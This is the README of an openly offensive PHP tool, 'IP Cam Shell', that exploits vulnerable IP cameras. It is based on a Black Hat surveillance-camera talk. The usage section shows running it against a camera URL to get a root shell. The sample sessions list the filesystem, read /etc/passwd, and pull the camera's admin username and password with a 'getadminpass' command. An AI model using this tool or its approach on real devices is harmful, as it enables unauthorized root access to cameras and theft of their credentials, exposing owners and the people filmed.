IP Cam Shell
=======

IPCS is a command line script for testing and exploiting a wide range of IP cameras as demonstrated by Craig Heffner in "Exploiting Surveillance Cameras Like a Hollywood Hacker". See the slides here: https://media.blackhat.com/us-13/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-WP.pdf

Requirements
=======

 * PHP 5
 * A distribution of Linux. I haven't and won't test this on Windows.

Usage
=======

Using IPCS is pretty straight forward. You pass the URL to ipcs.php via the -u option. 

```
$ php ipcs.php -u http://192.168.0.3:8080
```

If the camera is vulnerable you'll be dropped in to a "shell" as root and be able to exploit the camera further.

```
$ php ipcs.php -u http://192.168.0.3:8080
Those who do not understand UNIX are condemned to reinvent it, poorly. — Henry Spencer
ipcamshell>
```

It's very much like being logged in to a stripped down Unix server as root.

```
ipcamshell> whoami
root
ipcamshell> id
uid=0(root) gid=0(root)
ipcamshell> ls /
bin
dev
etc
lib
linuxrc
mnt
opt
proc
sbin
scripts
tmp
usr
var
ipcamshell> cat /etc/passwd
root:x:0:0:Linux User,,,:/:/bin/sh
```

Of course it wouldn't be very fun without the ability to login and view the camera... 

```
ipcamshell> getadminpass
Username: admin
Password: hunter2
```

`quit`, `exit`, and `^C` also work to kill the process.

If the camera isn't vulnerable, the server isn't up, or the internet hates you, you'll recieve the following message:

```
Sorry, the server specified isn't vulnerable.
```

Note
=======
I do not claim the description or purpose of this tool to be 100% accurate. If you see anything which is incorrect in this document, please submit a pull request or open a new issue.
